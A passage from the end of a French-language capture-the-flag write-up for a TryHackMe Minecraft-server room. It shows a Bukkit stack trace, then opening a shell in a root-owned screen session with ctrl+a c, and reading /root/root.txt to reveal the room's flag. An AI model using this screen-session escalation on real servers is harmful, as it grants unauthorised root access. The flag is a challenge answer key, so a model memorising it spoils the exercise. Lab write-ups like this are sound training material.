        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:62) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:589) ~[?:?]
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:522) ~[?:?]
        ... 12 more
[13:00:25 INFO]: Server permissions file permissions.yml is empty, ignoring it
[13:00:26 INFO]: Done (1.103s)! For help, type "help" or "?"
>
```

On on charge le plugins mais on n'a pas de shell.  
Dans screen pour ouvrire un shell il faut faire ctrl+a c

```bash
# id
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
# cat /root/root.txt
THM{8bb1eda065ceefb5795a245568350a70}
```

On obtient un shell root.
On lit le fichier root.txt dans root et on a notre flag.  
Le flag est : THM{8bb1eda065ceefb5795a245568350a70}   